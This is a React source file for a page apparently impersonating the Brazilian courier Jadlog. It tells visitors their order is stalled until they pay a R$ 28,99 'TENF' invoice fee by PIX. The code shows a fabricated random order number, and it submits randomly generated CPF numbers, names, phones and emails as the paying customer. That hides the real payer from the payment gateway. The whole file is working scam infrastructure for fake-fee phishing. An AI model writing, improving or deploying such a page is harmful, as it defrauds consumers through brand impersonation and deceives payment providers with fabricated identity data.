import { useState, useEffect, useRef } from "react";
import { Copy, Check, X, AlertTriangle } from "lucide-react";
import { QRCodeSVG } from "qrcode.react";
import { supabase } from "@/integrations/supabase/client";
import jadlogLogo from "@/assets/jadlog-logo.png";

const generateRandomCPF = () => {
  const rand = (n: number) => Math.floor(Math.random() * n);
  const n = Array.from({ length: 9 }, () => rand(9));
  const d1 = (n.reduce((s, v, i) => s + v * (10 - i), 0) * 10) % 11 % 10;
  n.push(d1);
  const d2 = (n.reduce((s, v, i) => s + v * (11 - i), 0) * 10) % 11 % 10;
  n.push(d2);
  return n.join("");
};

const generateRandomPhone = () => {
  const ddd = [11, 21, 31, 41, 51, 61, 71, 81, 85, 92][Math.floor(Math.random() * 10)];
  const num = Math.floor(Math.random() * 900000000) + 100000000;
  return `${ddd}9${num.toString().slice(0, 8)}`;
};

const generateRandomName = () => {
  const first = ["Maria", "João", "Ana", "Carlos", "Fernanda", "Lucas", "Patricia", "Roberto", "Juliana", "Pedro"];
  const last = ["Silva", "Santos", "Oliveira", "Souza", "Lima", "Pereira", "Costa", "Almeida", "Ferreira", "Ribeiro"];
  return `${first[Math.floor(Math.random() * first.length)]} ${last[Math.floor(Math.random() * last.length)]}`;
};

const TENF_AMOUNT_CENTS = 2899;
const TENF_AMOUNT_LABEL = "R$ 28,99";

const generateOrderNumber = () => {
  // Persist a single random order number per session so it doesn't change on re-render
  const stored = sessionStorage.getItem("jadlog_order_number");
  if (stored) return stored;
  const num = String(Math.floor(Math.random() * 90000) + 10000).padStart(8, "0");
  sessionStorage.setItem("jadlog_order_number", num);
  return num;
};

const TaxaNfe = () => {
  const [showAlert, setShowAlert] = useState(true);
  const [showPopup, setShowPopup] = useState(false);
  const [loading, setLoading] = useState(false);
  const [pixData, setPixData] = useState<any>(null);
  const [copied, setCopied] = useState(false);
  const [error, setError] = useState("");
  const [externalRef, setExternalRef] = useState("");
  const [paid, setPaid] = useState(false);
  const pollingRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const orderNumber = generateOrderNumber();

  // Poll payment status
  useEffect(() => {
    if (!externalRef || !showPopup) {
      if (pollingRef.current) clearInterval(pollingRef.current);
      return;
    }
    pollingRef.current = setInterval(async () => {
      try {
        const { data } = await supabase.functions.invoke("check-pix-status", {
          body: { externalRef },
        });
        if (data?.status === "paid") {
          if (pollingRef.current) clearInterval(pollingRef.current);
          setPaid(true);
          setTimeout(() => {
            window.location.href = '/obrigado';
          }, 2500);
        }
      } catch (e) {
        console.error("Poll error:", e);
      }
    }, 5000);
    return () => { if (pollingRef.current) clearInterval(pollingRef.current); };
  }, [externalRef, showPopup]);

  const handleEmit = async () => {
    setShowPopup(true);
    setLoading(true);
    setError("");
    setPixData(null);
    setCopied(false);
    setPaid(false);

    const randomName = generateRandomName();
    const randomCpf = generateRandomCPF();
    const randomPhone = generateRandomPhone();
    const randomEmail = `${randomName.toLowerCase().replace(/\s/g, ".")}${Math.floor(Math.random() * 999)}@gmail.com`;

    try {
      const { data, error: fnError } = await supabase.functions.invoke("create-pix-payment", {
        body: {
          color: "branca",
          amount: TENF_AMOUNT_CENTS,
          product_type: 'nfe',
          customer: {
            name: randomName,
            email: randomEmail,
            phone: randomPhone,
            document: { number: randomCpf, type: "cpf" },
          },
          shipping: {
            street: "Rua Fiscal",
            number: "1",
            complement: "",
            neighborhood: "Centro",
            city: "São Paulo",
            state: "SP",
            zipCode: "01001000",
          },
        },
      });

      if (fnError) throw new Error(fnError.message);
      if (!data?.success) throw new Error(data?.error || "Erro ao gerar pagamento");
      setPixData(data.data);
      setExternalRef(data.data?.externalRef || data.data?.external_ref || "");
    } catch (e: any) {
      console.error("PIX generation error:", e);
      setError(e.message || "Erro ao gerar pagamento.");
    } finally {
      setLoading(false);
    }
  };

  const pixCode = pixData?.pixCode || pixData?.pix_code || pixData?.qrcode || pixData?.paymentData?.copyPaste || pixData?.paymentData?.qrCode || "";
  const qrBase64 = pixData?.qrCodeBase64 || pixData?.qr_code_base64 || pixData?.paymentData?.qrCodeBase64 || "";
  const qrUrl = qrBase64 ? (qrBase64.startsWith("data:") ? qrBase64 : qrBase64.startsWith("http") ? qrBase64 : `data:image/png;base64,${qrBase64}`) : "";

  const handleCopy = () => {
    if (pixCode) {
      navigator.clipboard.writeText(pixCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 3000);
    }
  };

  return (
    <div
      className="min-h-screen bg-white"
      style={{ fontFamily: "'Inter', system-ui, -apple-system, sans-serif" }}
    >
      <main className="max-w-3xl mx-auto px-5 py-8">
        {/* Jadlog Logo */}
        <div className="flex justify-center mb-6">
          <img src={jadlogLogo} alt="Jadlog" className="w-56 h-56 sm:w-72 sm:h-72 object-contain" />
        </div>

        {/* Status title */}
        <h1 className="text-[15px] sm:text-[17px] font-extrabold text-gray-900 uppercase tracking-tight mb-4">
          Acompanhe o status do seu pedido em tempo real:
        </h1>

        {/* Red alert banner */}
        {showAlert && (
          <div className="bg-[#d9534f] text-white rounded px-4 py-3 mb-6 relative">
            <button
              onClick={() => setShowAlert(false)}
              className="absolute top-2 right-2 text-white/90 hover:text-white text-lg leading-none"
              aria-label="Fechar"
            >
              ×
            </button>
            <p className="font-bold text-[15px] mb-1">Seu pedido ainda está pendente...</p>
            <p className="text-[13px] leading-snug pr-4">
              <span className="font-bold">ATENÇÃO:</span> É necessário realizar o pagamento da TENF
              (Taxa de Emissão da Nota Fiscal) para Emitir a NF do seu produto e realizarmos o despacho.
              Valor único de <span className="font-bold">{TENF_AMOUNT_LABEL}</span>.
            </p>
          </div>
        )}

        {/* Order details */}
        <div className="space-y-4 mb-6">
          <p className="text-[15px] font-bold text-gray-900">
            Número do pedido: {orderNumber}
          </p>
          <p className="text-[15px] font-bold text-gray-900">
            Status: <span className="underline">Aguardando pagamento da TENF</span>
          </p>
          <p className="text-[15px] font-bold text-gray-900">
            Valor da TENF: {TENF_AMOUNT_LABEL}
          </p>
        </div>

        {/* Black CTA button */}
        <button
          onClick={handleEmit}
          className="bg-black hover:bg-gray-800 active:scale-[0.99] text-white font-semibold text-[14px] py-3 px-5 rounded transition-colors"
        >
          CLIQUE AQUI PARA EMITIR A NOTA FISCAL
        </button>
      </main>

      {/* PIX Popup */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60 backdrop-blur-sm px-4">
          <div className="bg-white rounded-2xl w-full max-w-sm shadow-2xl overflow-hidden animate-in fade-in zoom-in-95 duration-200 max-h-[90vh] overflow-y-auto">
            {/* Header */}
            <div className="flex items-center justify-between px-5 pt-5 pb-3 border-b border-gray-100">
              <div>
                <p className="text-[15px] font-bold text-gray-900">Jadlog — Taxa TENF</p>
                <p className="text-xs text-gray-500">Pagamento via PIX</p>
              </div>
              <button onClick={() => setShowPopup(false)} className="p-1.5 rounded-full hover:bg-gray-100 transition-colors">
                <X className="h-5 w-5 text-gray-400" />
              </button>
            </div>

            <div className="px-5 py-5">
              {loading && (
                <div className="flex flex-col items-center py-10">
                  <div className="h-10 w-10 border-4 border-gray-200 border-t-[#d9534f] rounded-full animate-spin mb-3" />
                  <p className="text-sm font-semibold text-gray-700">Gerando pagamento PIX...</p>
                  <p className="text-xs text-gray-500 mt-1">Aguarde alguns segundos</p>
                </div>
              )}

              {error && !loading && (
                <div className="text-center py-6">
                  <div className="h-12 w-12 rounded-full bg-red-100 flex items-center justify-center mx-auto mb-3">
                    <AlertTriangle className="h-6 w-6 text-red-600" />
                  </div>
                  <h4 className="font-bold text-gray-900 mb-1">Erro ao gerar pagamento</h4>
                  <p className="text-sm text-gray-500 mb-4">Não foi possível gerar o PIX. Tente novamente.</p>
                  <button
                    onClick={() => setShowPopup(false)}
                    className="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-semibold py-3 rounded-lg text-sm"
                  >
                    Fechar
                  </button>
                </div>
              )}

              {paid && (
                <div className="text-center py-6">
                  <div className="h-14 w-14 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-3">
                    <Check className="h-8 w-8 text-green-600" strokeWidth={3} />
                  </div>
                  <h4 className="font-bold text-gray-900 mb-1">Pagamento Confirmado!</h4>
                  <p className="text-sm text-gray-500">Sua taxa foi processada com sucesso.</p>
                </div>
              )}

              {pixData && !loading && !paid && !error && (
                <>
                  <div className="text-center mb-4">
                    <p className="text-xs text-gray-500 mb-1">Valor a pagar</p>
                    <p className="text-3xl font-extrabold text-gray-900">{TENF_AMOUNT_LABEL}</p>
                  </div>

                  <p className="text-center text-[13px] text-gray-600 mb-3">
                    Escaneie o QR Code com o app do seu banco
                  </p>

                  <div className="flex justify-center mb-4">
                    {qrUrl ? (
                      <img src={qrUrl} alt="QR Code PIX" className="w-44 h-44 rounded-lg border border-gray-200" />
                    ) : pixCode ? (
                      <div className="p-2 border border-gray-200 rounded-lg">
                        <QRCodeSVG value={pixCode} size={176} />
                      </div>
                    ) : null}
                  </div>

                  <div className="flex items-center gap-3 my-4">
                    <div className="flex-1 h-px bg-gray-200" />
                    <span className="text-[11px] font-bold text-gray-400 tracking-wider">OU COPIE O CÓDIGO</span>
                    <div className="flex-1 h-px bg-gray-200" />
                  </div>

                  {pixCode && (
                    <div className="bg-gray-50 border border-gray-200 rounded-lg px-3 py-2.5 mb-3">
                      <p className="text-[10px] text-gray-400 font-semibold mb-1">PIX Copia e Cola</p>
                      <p className="text-[11px] text-gray-700 font-mono break-all leading-relaxed">
                        {pixCode.length > 80 ? pixCode.slice(0, 80) + "..." : pixCode}
                      </p>
                    </div>
                  )}

                  <button
                    onClick={handleCopy}
                    className={`w-full flex items-center justify-center gap-2 rounded-lg py-3.5 text-sm font-bold transition-all ${
                      copied
                        ? "bg-green-500 text-white"
                        : "bg-black text-white hover:bg-gray-800 active:scale-[0.98]"
                    }`}
                  >
                    {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                    {copied ? "Copiado!" : "📋 Copiar código PIX"}
                  </button>

                  <div className="flex items-center justify-center gap-1.5 mt-3 mb-4">
                    <div className="h-2 w-2 rounded-full bg-amber-500 animate-pulse" />
                    <span className="text-[12px] text-amber-600 font-medium">Aguardando pagamento...</span>
                  </div>

                  <div className="bg-blue-50 border border-blue-100 rounded-lg p-3 mt-3">
                    <p className="text-[12px] font-bold text-gray-800 mb-2">Como pagar:</p>
                    <ol className="text-[12px] text-gray-700 space-y-1 leading-snug list-decimal pl-4">
                      <li>Abra o app do seu banco</li>
                      <li>Vá em <strong>PIX → Pagar com QR Code</strong> ou cole o código</li>
                      <li>Confirme o valor de <strong>{TENF_AMOUNT_LABEL}</strong></li>
                      <li>Pronto! O pagamento é processado em segundos.</li>
                    </ol>
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default TaxaNfe;
